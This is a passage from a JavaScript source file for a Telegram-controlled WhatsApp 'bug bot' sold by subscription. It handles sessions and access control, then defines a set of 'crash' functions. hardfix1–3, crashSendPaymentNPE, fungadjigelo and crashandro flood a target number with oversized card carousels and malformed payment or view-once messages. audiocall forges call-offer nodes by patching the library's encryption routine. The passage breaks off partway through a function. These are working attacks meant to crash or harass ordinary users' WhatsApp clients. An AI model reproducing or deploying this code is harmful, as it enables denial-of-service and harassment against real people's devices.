// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 1/7: Lines 1-650
// Total: ~4550 Lines
// =====================================================================

// إقلاع آمن: تحميل المتغيرات من .env قبل أي شيء آخر
require("dotenv").config();

const { Bot, InlineKeyboard, InputFile } = require("grammy");
const fs = require("fs");
const path = require("path");
// تم حذف require("child_process") — كان مستوردًا وغير مستخدم (باب خطر)
const {
  default: makeWASocket,
  // تم حذف makeInMemoryStore / useSingleFileAuthState / initInMemoryKeyStore:
  // غير موجودة في Baileys v6 (قيمها undefined) وغير مستخدمة
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  relayMessage,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  encodeWAMessage,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  makeCacheableSignalKeyStore,
  WAProto,
  proto,
  jidDecode,
  encodeSignedDeviceIdentity,
  BaileysError
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const crypto = require("crypto");
const { Boom } = require("@hapi/boom");
const axios = require("axios");
const config = require("./config");
const chalk = require("chalk");
const store = require("./lib/store");
const { registerAdminPanel } = require("./lib/adminPanel");
const thumbnail = fs.existsSync(store.resolvePath("./storage/thumbnail.jpg"))
  ? fs.readFileSync(store.resolvePath("./storage/thumbnail.jpg"))
  : null;

// =====================================================================
// التحقق من الإعدادات قبل الإقلاع
// =====================================================================
// القديم: new Bot(config.telegramBotToken || "YOUR_BOT_TOKEN")
// → لو التوكن ناقص كان يعطي خطأ غامض من grammy بعد تحميل 4000 سطر.
const configErrors = config.validate();
if (configErrors.length > 0) {
  console.error("\n❌ ما أقدر أشغّل البوت — إعدادات ناقصة:\n");
  configErrors.forEach((e) => console.error("   • " + e));
  console.error("\nانسخ .env.example إلى .env واملأ القيم المطلوبة.\n");
  process.exit(1);
}
const CHANNEL_ID = config.chanelid || "I8_ZU";
const GROUP_ID = config.chatgrupid || "I8_ZU_group";

// =====================================================================
// Blacklist & Whitelist System
// =====================================================================

let blacklist = [];
let whitelist = [];

function loadBlacklist() {
  try {
    if (fs.existsSync("./storage/blacklist.json")) {
      blacklist = JSON.parse(fs.readFileSync("./storage/blacklist.json", "utf8"));
    } else {
      fs.writeFileSync("./storage/blacklist.json", JSON.stringify([], null, 2));
      blacklist = [];
    }
  } catch (e) {
    blacklist = [];
  }
}

function saveBlacklist() {
  try {
    fs.writeFileSync("./storage/blacklist.json", JSON.stringify(blacklist, null, 2));
  } catch (e) {}
}

function loadWhitelist() {
  try {
    if (fs.existsSync("./storage/whitelist.json")) {
      whitelist = JSON.parse(fs.readFileSync("./storage/whitelist.json", "utf8"));
    } else {
      fs.writeFileSync("./storage/whitelist.json", JSON.stringify([], null, 2));
      whitelist = [];
    }
  } catch (e) {
    whitelist = [];
  }
}

function saveWhitelist() {
  try {
    fs.writeFileSync("./storage/whitelist.json", JSON.stringify(whitelist, null, 2));
  } catch (e) {}
}

loadBlacklist();
loadWhitelist();

// =====================================================================
// Safe File Reading with Error Handling
// =====================================================================

// =====================================================================
// تم تحويل القراءة/الكتابة إلى lib/store:
//   • مسارات تُنسب لجذر المشروع (مو لمجلد التشغيل cwd)
//   • كتابة ذرّية (tmp + rename) بدل writeFileSync المباشر
//   • كاش يعتمد على mtime → تعديل الملف يدويًا ينعكس فورًا
// =====================================================================

function safeReadJSON(filePath, defaultValue = {}) {
  return store.readJSON(filePath, defaultValue);
}

function safeWriteJSON(filePath, data) {
  return store.writeJSON(filePath, data);
}

// =====================================================================
// ⚠️ إصلاح مشكلة جوهرية:
// القديم كان يقرأ access/resellers/settings مرة واحدة عند الإقلاع
// ويحتفظ بنسخة في الذاكرة → /addacces و /delacces يكتبون الملف بس
// hasAccess ما يشوف التغيير إلا بعد إعادة تشغيل البوت.
// الحين القراءة حيّة مع كاش.
// =====================================================================

const getSettingsDb = () =>
  store.readJSON("./database/settings.json", { freeMode: false });
const getAccessDb = () =>
  store.readJSON("./storage/access.json", { users: [] });
const getResellerDb = () =>
  store.readJSON("./storage/resellers.json", { users: [] });

// =====================================================================
// Utility Functions
// =====================================================================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const formatUptime = (sec) => {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  return `${h}h ${m}m ${s}s`;
};

const isOwner = (userId) => {
  const ownerId = config.ownerId || "123456789";
  return String(userId) === String(ownerId);
};

const isReseller = (userId) => {
  const db = getResellerDb();
  return Array.isArray(db.users) && db.users.includes(String(userId));
};

const isFreeMode = () => {
  return getSettingsDb().freeMode === true;
};

const hasAccess = (userId) => {
  if (isFreeMode()) return true;
  if (isOwner(userId)) return true;
  if (isReseller(userId)) return true;
  const access = getAccessDb();
  if (Array.isArray(access.users) && access.users.includes(String(userId))) {
    return true;
  }
  return false;
};

const isBlocked = (number) => {
  return blacklist.includes(number);
};

const isWhitelisted = (number) => {
  return whitelist.includes(number);
};

const getNoAccessMessage = (userId) => {
  return `🔒 **Premium Bot Active**

Currently, this bot can only be used by users with special access.

━━━━━━━━━━━━━━
💠 Bot Access Prices
• bug bot no enc script 100% ($15 USD)
• Basic Access: ($4 USD) / Month 
• Lifetime Access: ($7 USD) / Lifetime
━━━━━━━━━━━━━━
✨ Premium Benefits
• Full access to all features
• Unlimited usage
• Automatic feature updates
• Priority support directly from the Owner
━━━━━━━━━━━━━━

📩 Want to Upgrade Your Access?
Chat the admin to purchase access:
• Telegram: @I8_ZU

Click the ORDER button below to buy`;
};

// =====================================================================
// Logging System
// =====================================================================

const log = {
  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
};

// =====================================================================
// Cooldown System Integration
// =====================================================================

const cooldownModule = require("./controlSystem/sumemek.js");
const cooldown = require("./controlSystem/cooldown.js");

// =====================================================================
// WhatsApp Session Management
// =====================================================================

const waClients = {};
// القديم: path.join(".", "session") → مسار نسبي يعتمد على مكان التشغيل،
// فكان يخلق مجلد جلسات في مكان غلط (أو يفقد الجلسات) حسب cwd.
const sessionRoot = store.resolvePath("./" + (config.sessionName || "session"));
if (!fs.existsSync(sessionRoot)) {
  fs.mkdirSync(sessionRoot, { recursive: true });
}

function getSessionPathForUser(userId) {
  return path.join(sessionRoot, String(userId));
}

async function checkSessionExistsForUser(userId) {
  try {
    await fs.promises.access(getSessionPathForUser(userId));
    return true;
  } catch {
    return false;
  }
}

async function deleteSessionForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    if (waClients[userId]?.sock) {
      try { waClients[userId].sock.end(); } catch (e) {}
      delete waClients[userId];
    }
    await fs.promises.rm(p, { recursive: true, force: true });
    log.success(`Session for user ${userId} deleted`);
    return true;
  } catch (err) {
    log.error(`Failed to delete session for ${userId}: ${err.message}`);
    return false;
  }
}

async function clearAllSessions() {
  try {
    const folders = fs.existsSync(sessionRoot) ? fs.readdirSync(sessionRoot) : [];
    for (const f of folders) {
      if (waClients[f]?.sock) {
        try { waClients[f].sock.end(); } catch (e) {}
        delete waClients[f];
      }
    }
    for (const f of folders) {
      try {
        await fs.promises.rm(path.join(sessionRoot, f), { recursive: true, force: true });
      } catch (e) {}
    }
    log.success("All sessions cleared");
    return true;
  } catch (err) {
    log.error(`Failed to clear sessions: ${err.message}`);
    return false;
  }
}

// =====================================================================
// إصدار عميل واتساب — أهم إصلاح في الملف
// =====================================================================
// بدون تمرير `version` إلى makeWASocket، يستخدم Baileys الإصدار المضمّن
// داخل الحزمة. في 6.7.9 هو [2,3000,1017531287] (قديم جدًا)، وواتساب
// يرفض عملاء الويب القدامى → يُغلق الاتصال فورًا وما يوصل أي كود ربط.
// =====================================================================

let cachedWAVersion;

async function resolveWAVersion() {
  if (cachedWAVersion) return cachedWAVersion;

  try {
    const { version, isLatest } = await fetchLatestBaileysVersion();

    // ⚠️ فخ مهم: لو فشل الاتصال بالإنترنت، الدالة ترجع الإصدار المضمّن
    // القديم مع isLatest:false — وبصمت، بدون استثناء. لازم نفحصها.
    if (!isLatest) {
      log.warning(
        "تعذّر جلب أحدث إصدار واتساب من الإنترنت — سيُستخدم الإصدار المضمّن في المكتبة"
      );
      if (!config.offlineVersionFallback) {
        throw new Error(
          "إصدار واتساب قديم و OFFLINE_VERSION_FALLBACK معطّل"
        );
      }
      log.warning("قد يُرفض الاتصال. شغّل `npm run doctor` للتشخيص.");
    } else {
      log.success(`إصدار عميل واتساب: ${version.join(".")}`);
    }

    cachedWAVersion = version;
    return version;
  } catch (err) {
    log.error(`فشل تحديد إصدار واتساب: ${err.message}`);
    throw err;
  }
}

/**
 * انتظار فعلي لفتح الـ WebSocket قبل استدعاء requestPairingCode.
 *
 * ⚠️ ليش مو waitForConnectionUpdate({connection:"connecting"})؟
 * لأن هذا الحدث يُطلق في process.nextTick بعد إنشاء السوكيت مباشرة،
 * أي القبل ما يفتح الـ WebSocket فعليًا (راجع
 * socket.js في Baileys). و sendRawMessage — اللي تستخدمها
 * requestPairingCode — ترمي Boom("Connection Closed") مباشرة إذا كان
 * !ws.isOpen. فالانتظار لحدث "connecting" لا يضمن شيئًا.
 *
 * الأداة الصحيحة هي sock.waitForSocketOpen():
 *   • ترجع فورًا إذا كان ws.isOpen
 *   • ترفض فورًا إذا كان مغلقًا/يُغلق
 *   • تنتظر حدث open غير ذلك
 */
async function waitForSocketReady(sock, timeoutMs = 15000) {
  if (!sock || typeof sock.waitForSocketOpen !== "function") {
    return false;
  }

  let settled = false;

  const opened = sock
    .waitForSocketOpen()
    .then(() => {
      settled = true;
      return true;
    })
    .catch(() => false);

  const timeout = sleep(timeoutMs).then(() => settled);

  return Promise.race([opened, timeout]);
}

async function initWhatsappForUser(telegramUserId, notifyUser = true, retryCount = 0) {
  const MAX_RETRIES = 3;
  const RECONNECT_DELAY = 2000;
  const userId = String(telegramUserId);
  const sessionPath = getSessionPathForUser(userId);

  try {
    if (!fs.existsSync(sessionPath)) {
      fs.mkdirSync(sessionPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    // ⚠️ الإصلاح الحاسم: تمرير إصدار العميل
    const waVersion = await resolveWAVersion();

    const sock = makeWASocket({
      version: waVersion,
      // القديم كان "silent" دائمًا → كان يخفي سبب فشل الاتصال تمامًا
      logger: pino({ level: config.logLevel || "info" }),
      auth: state,
      // القديم: ["Ubuntu","Chrome","20.0.04"] — صيغة إصدار غير صحيحة
      browser: ["Ubuntu", "Chrome", "22.04.4"],
      syncFullHistory: false,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 30000,
      retryRequestDelayMs: 1000,
      messageRetryMap: new Map(),
      shouldIgnoreJid: (jid) => false,
      getMessage: async (key) => ({ conversation: "Message not available" }),
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        );
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {},
                },
                ...message,
              },
            },
          };
        }
        return message;
      },
      printQRInTerminal: false,
      queryChatCount: 0,
    });

    sock.ev.on("creds.update", saveCreds);

    waClients[userId] = {
      sock,
      status: "connecting",
      sessionPath,
      reconnecting: false,
      lastActivity: Date.now(),
      messageCount: 0,
    };

    const connectionMonitor = setInterval(() => {
      if (waClients[userId]?.status === "open") {
        const timeSinceLastActivity = Date.now() - (waClients[userId].lastActivity || Date.now());
        if (timeSinceLastActivity > 120000) {
          waClients[userId].lastActivity = Date.now();
        }
      }
    }, 60000);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};

      try {
        if (connection === "close") {
          clearInterval(connectionMonitor);
          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          const disconnectReason = DisconnectReason[reason] || reason || "unknown";

          log.warning(`WA (${userId}) disconnected: ${disconnectReason}`);
          waClients[userId].status = "closed";

          if (reason === DisconnectReason.loggedOut || reason === 401 || reason === 403) {
            log.warning(`User ${userId} logged out. Deleting session...`);
            try {
              if (waClients[userId]?.sock?.end) {
                waClients[userId].sock.end();
              }
            } catch (e) {}

            await deleteSessionForUser(userId);
            delete waClients[userId];

            try {
              await bot.api.sendMessage(
                telegramUserId,
                "🚫 *WhatsApp session removed*\nYour WhatsApp session was logged out or banned. Please re-pair using /reqpair.",
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(`Failed to notify user ${userId}: ${err.message}`);
            }
          } else {
            if (!waClients[userId]?.reconnecting && retryCount < MAX_RETRIES) {
              waClients[userId].reconnecting = true;
              log.loading(`Reconnecting WA for user ${userId} (attempt ${retryCount + 1}/${MAX_RETRIES})...`);

              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await sleep(500);
              } catch (e) {}

              setTimeout(() => {
                if (waClients[userId]) {
                  waClients[userId].reconnecting = false;
                  initWhatsappForUser(telegramUserId, notifyUser, retryCount + 1);
                }
              }, RECONNECT_DELAY);
            } else if (retryCount >= MAX_RETRIES) {
              log.error(`Failed to reconnect WA for user ${userId} after ${MAX_RETRIES} attempts.`);
              clearInterval(connectionMonitor);
              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await deleteSessionForUser(userId);
                delete waClients[userId];

                await bot.api.sendMessage(
                  telegramUserId,
                  "🚫 *WhatsApp session deleted*\nUnable to reconnect after 3 attempts. Please pair again using /reqpair.",
                  { parse_mode: "Markdown" }
                );
              } catch (err) {}
            }
          }
        } else if (connection === "open") {
          waClients[userId].status = "open";
          waClients[userId].lastActivity = Date.now();
          log.whatsapp(`✅ WhatsApp Connected for user ${userId}!`);

          const { pairingMessageId, waitMessageId } = waClients[userId] || {};
          try {
            if (pairingMessageId) await bot.api.deleteMessage(telegramUserId, pairingMessageId).catch(() => {});
            if (waitMessageId) await bot.api.deleteMessage(telegramUserId, waitMessageId).catch(() => {});
            waClients[userId].pairingMessageId = null;
            waClients[userId].waitMessageId = null;
          } catch (e) {}

          if (notifyUser) {
            try {
              await bot.api.sendMessage(
                telegramUserId,
                `✅ *WhatsApp paired successfully.*\nYour session is ready to use.`,
                { parse_mode: "Markdown" }
              );
            } catch (err) {}
          }
        }
      } catch (e) {
        log.error(`Error in connection.update for user ${userId}: ${e.message}`);
      }
    });

    sock.ev.on("connection.error", (error) => {
      log.error(`Socket error for ${userId}: ${error.message}`);
    });

    return sock;
  } catch (err) {
    log.error(`Failed to init WhatsApp for user ${userId}: ${err.message}`);
    return null;
  }
}

async function requestPairingCodeForUser(telegramUserId, phone) {
  try {
    const userId = String(telegramUserId);

    // حذف الجلسة القديمة إذا كانت موجودة
    if (waClients[userId]) {
      try {
        if (waClients[userId].sock) {
          await waClients[userId].sock.end();
        }
      } catch (e) {
        console.log(`Error closing old session for ${userId}: ${e.message}`);
      }
      delete waClients[userId];
      console.log(`Old session deleted for ${userId}`);
    }

    // إنشاء جلسة جديدة
    await initWhatsappForUser(userId, false);

    // ⚠️ إصلاح: بدل setTimeout ثابت 2000ms ننتظر جاهزية السوكيت فعليًا
    const client = waClients[userId]?.sock;
    if (!client) throw new Error("Failed to create WA client for pairing");

    if (waClients[userId].status !== "open") {
      await waitForSocketReady(client, 15000);
    }

    if (!waClients[userId]?.sock) {
      throw new Error("WhatsApp socket closed before pairing could start");
    }

    if (typeof client.requestPairingCode === "function") {
      const code = await client.requestPairingCode(phone);
      return code;
    } else {
      throw new Error("Pairing code API not available");
    }
  } catch (err) {
    console.log(`Pairing error: ${err.message}`);
    throw err;
  }
}
// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 2/7: Lines 651-1300
// Total: ~4550 Lines
// =====================================================================

// =====================================================================
// CRASH / BUG FUNCTIONS - All 20+ Functions
// =====================================================================

async function hardfix1(client, X) {
  try {
    let cards = [];
    const maxCards = 500;

    for (let r = 0; r < maxCards; r++) {
      cards.push({
        body: { text: '' },
        header: {
          title: '',
          imageMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
            fileLength: "98",
            height: 4,
            width: 4,
            mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
            fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
            directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1749728782"
          },
          hasMediaAttachment: true
        },
        nativeFlowMessage: {
          messageParamsJson: '',
          buttons: [{
            name: "voice_call",
            buttonParamsJson: {}
          }]
        }
      });
    }

    const msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: { text: '𝗫 - 𝗭 𝗘 𝗡 𝗢' },
            carouselMessage: {
              cards: cards
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              quotedMessage: {},
              remoteJid: "@s.whatsapp.net"
            }
          }
        }
      }
    }, {});

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: msg.message,
      },
    }, {
      messageId: msg.key.id,
      participant: { jid: X },
    });

    await sleep(100);
  } catch (err) {
    log.error(`hardfix1 error: ${err.message}`);
  }
}

async function hardfix2(client, X) {
  try {
    let cards = [];
    const maxCards = 300;

    for (let r = 0; r < maxCards; r++) {
      cards.push({
        body: { text: " " },
        footer: { text: " " },
        header: {
          title: " ",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
            fileLength: "18352",
            height: 720,
            width: 1280,
            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1737281900",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
            scanLengths: [3537, 10557, 1905, 2353],
            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
          },
        },
        nativeFlowMessage: {
          buttons: [],
        },
      });
    }

    const msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            body: { text: " " },
            footer: { text: "\u0003" },
            header: { hasMediaAttachment: false },
            carouselMessage: {
              cards: cards,
            },
          },
        },
      },
    }, {});

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: msg.message,
      },
    }, {
      messageId: msg.key.id,
      participant: { jid: X },
    });

    await sleep(100);
  } catch (err) {
    log.error(`hardfix2 error: ${err.message}`);
  }
}

async function hardfix3(client, X) {
  try {
    let cards = [];
    const maxCards = 400;

    for (let r = 0; r < maxCards; r++) {
      cards.push({
        body: { text: " " },
        footer: { text: " " },
        header: {
          title: " ",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
            fileLength: "18352",
            height: 720,
            width: 1280,
            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1737281900",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
            scanLengths: [3537, 10557, 1905, 2353],
            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
          },
        },
        nativeFlowMessage: {
          buttons: [],
        },
      });
    }

    const msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            body: { text: " " },
            footer: { text: "\u0003" },
            header: { hasMediaAttachment: false },
            carouselMessage: {
              cards: cards,
            },
          },
        },
      },
    }, {});

    await client.relayMessage(X, {
      groupStatusMessageV2: {
        message: msg.message,
      },
    }, {
      messageId: msg.key.id,
      participant: { jid: X },
    });

    await sleep(100);
  } catch (err) {
    log.error(`hardfix3 error: ${err.message}`);
  }
}

async function crashSendPaymentNPE(client, X) {
  try {
    await client.relayMessage(X, {
      sendPaymentMessage: {
        noteMessage: null,
        requestMessageKey: undefined,
        background: null,
        contextInfo: {
          externalAdReply: null
        }
      }
    }, {
      participant: { jid: X },
      quoted: null
    });
    await sleep(50);
  } catch (err) {
    log.error(`crashSendPaymentNPE error: ${err.message}`);
  }
}

async function fungadjigelo(client, X) {
  try {
    await client.relayMessage(X, {
      sendPaymentMessage: {
        noteMessage: null,
        requestMessageKey: undefined,
        background: null,
        contextInfo: {
          externalAdReply: null
        }
      }
    }, {
      participant: { jid: X },
      quoted: null
    });
    await sleep(50);
  } catch (err) {
    log.error(`fungadjigelo error: ${err.message}`);
  }
}

async function audiocall(client, X) {
  try {
    let devices = (
      await client.getUSyncDevices([X], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await client.assertSessions(devices);

    let createMutex = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let mutexManager = createMutex();
    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let encodeMsg = client.encodeWAMessage?.bind(client);

    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let mapped = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = client.authState.creds.me;
      let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
        let isSelf = jid === meId || jid === meLid;

        if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

        let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

        return mutexManager.mutex(jid, async () => {
          let { type, ciphertext } = await client.signalRepository.encryptMessage({
            jid,
            data: bytes
          });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: { v: '2', type, ...extraAttrs },
              content: ciphertext
            }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
      await client.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
      );

    let callNode = {
      tag: "call",
      attrs: {
        to: X,
        id: client.generateMessageTag(),
        from: client.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": client.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
          }] : [])
        ]
      }]
    };

    await client.sendNode(callNode);
    await sleep(50);
  } catch (err) {
    log.error(`audiocall error: ${err.message}`);
  }
}

async function crashandro(client, X) {
  try {
    const cardsX = [];
    for (let r = 0; r < 15; r++) {
      cardsX.push({
        header: {
          title: "",
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
            fileLength: "289511",
            seconds: 15,
